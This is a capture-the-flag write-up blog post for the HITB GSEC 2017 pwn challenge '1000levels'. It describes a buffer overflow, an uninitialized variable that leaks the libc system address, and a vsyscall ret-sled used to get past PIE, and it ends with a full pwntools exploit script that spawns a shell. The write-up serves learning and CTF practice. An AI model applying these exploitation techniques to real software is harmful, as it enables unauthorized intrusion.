---
layout: post
title: "[HITB GSEC Singapore 2017] [Pwn] 1000levels"
---

### Description

It's more diffcult.

nc 47.74.147.103 20001

[Download Attachments](https://hitb.xctf.org.cn/media/task/498a3f10-8976-4733-8bdb-30d6f9d9fdad.gz)

### Analysis

Firstly, I check this file 

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This program have some functions :

1. Go
2. Hint
3. Give up

After open file in IDA. It's easy to see the first vuln : **bof**

```C
for ( i = read(0, &buf, 1024uLL); i & 7; ++i )
        *(&buf + i) = 0;
```

With this vuln, you can ret to anywhere. But `PIE` enabled, so you can't ret to any addr in program to leak stack or libc.

Studdenly, i remember a trick to bypass this `PIE`. Using `vsyscall`. The addr of `vsyscall` static in kernel. It just has some gadget to ret to the next addr in stack. If the next addr is in libc , You can overwrite some byte to return to addr you want in libc. But the line `*(&buf + i) = 0;` prevent you to do it.

I was stuck at this for a long time ... 

Then my bro in my team told me that i should debug more carefully at the step input number.

```C

 puts("How many levels?");
  v2 = read_num();
  if ( v2 > 0 )
    v5 = v2;
  else
    puts("Coward");
  puts("Any more?");
  v3 = read_num();
  v5 = v5 + v3;

```

if `v2 <=0` then `v5` **uninitialized** . Actually,  I had seen this vuln before, but i have no idea to do with it. Then i realized i haven't used the function `Hint` yet.

```C

if ( show_hint )
  {
    sprintf(&v1, "Hint: %p\n", &system, &system);
  }

```

This case never come true 'cause you can't change the value of `show_hint`. But after run this function, the libc function `system` will be in stack ! And more magicly is it's in the addr of `v5`. So everything will easy now.

### My exploit scenario : 

1. Run `Hint` 
2. Run `Go`
   - Input `<=0` number at first time 
   - Input the distance from `system` addr to the `one_gadget` addr in libc (cause `v5 = v5 + v3` )
   - Pass some levels to come nearly `v5` addr
   - Use **bof** vuln and vsyscall to ret to `v5` addr
   - Get shell and cat flag !!!

After debugging and calculating,i realized that after pass **997** levels, `rsp` will be near  `v5` address.



### Exploit code : 

```python
from pwn import *
vsyscall=0xffffffffff600000
one_gadget=0xf0274 # this offset conditions fit to this program

libc=ELF('libc.so.6')

def main(argv):
	if len(argv)<2:
		r=process('./1000levels')
	else:
		r=remote('47.74.147.103',20001)
	#pause()
	# Hint
	r.recvuntil('Choice:')
	r.sendline('2')

	# Go
	r.recvuntil('Choice:')
	r.sendline('1')

	r.recvuntil('levels?')
	r.sendline('-1')
	r.recvuntil('more?')
	to_one_gadget=one_gadget-libc.symbols['system']
	r.sendline(str(to_one_gadget))

	log.info('Calculating ... ')
	for i in xrange(997):
		r.recvuntil(': ')
		data=r.recvuntil(' =')
		#print data
		d=eval(data[:len(data)-1])
		r.recvuntil('Answer:')
		r.sendline(str(d))
	log.info('Done')
	#pause()
	r.recvuntil('Answer:')
	pl=""
	pl+="0"*56+p64(vsyscall)*23
	r.send(pl)
	
	r.interactive()

main(sys.argv)

```

![aa](http://i.imgur.com/3yFOeED.png)



I can't solve this challenge in the contest, and my team have no pwn : (. But at least, i learned many things from this challenge and the contest. 

Thank you **Peternguyen** for the hint and my teammate **QD** .

Congratz the HITB GSEC CTF runner-up **Injocker10K** from my team !



